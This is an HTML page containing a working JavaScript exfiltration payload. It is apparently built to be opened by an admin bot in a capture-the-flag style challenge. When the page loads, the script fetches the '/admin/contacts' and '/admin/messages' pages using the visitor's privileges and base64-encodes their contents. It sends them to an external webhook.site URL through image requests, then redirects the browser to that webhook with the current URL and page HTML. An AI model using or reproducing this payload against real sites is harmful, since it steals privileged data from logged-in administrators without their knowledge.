<!DOCTYPE html>
<html>
<body>
    <script>
        const webh = "https://webhook.site/eea9d67e-7379-46ca-b85a-c69dad2bf391";
        
        async function capture() {
            // Path 1: The general contacts list (where we saw the bot earlier)
            // Path 2: The specific message detail (trying a different potential path)
            const paths = ["/admin/contacts", "/admin/messages"];
            
            for (let path of paths) {
                try {
                    const r = await fetch(path);
                    const html = await r.text();
                    // Send a "heartbeat" to the webhook for each path
                    new Image().src = `${webh}/log?path=${btoa(path)}&data=${btoa(unescape(encodeURIComponent(html.substring(0, 3000))))}`;
                } catch(e) {}
            }

            // Finally, redirect the bot to show the current page it's actually on
            // This helps us see if the admin is looking at a "secret" URL
            setTimeout(() => {
                location.href = webh + "?final_url=" + btoa(window.location.href) + "&html=" + btoa(unescape(encodeURIComponent(document.body.innerHTML.substring(0,3000))));
            }, 2000);
        }
        capture();
    </script>
</body>
</html>
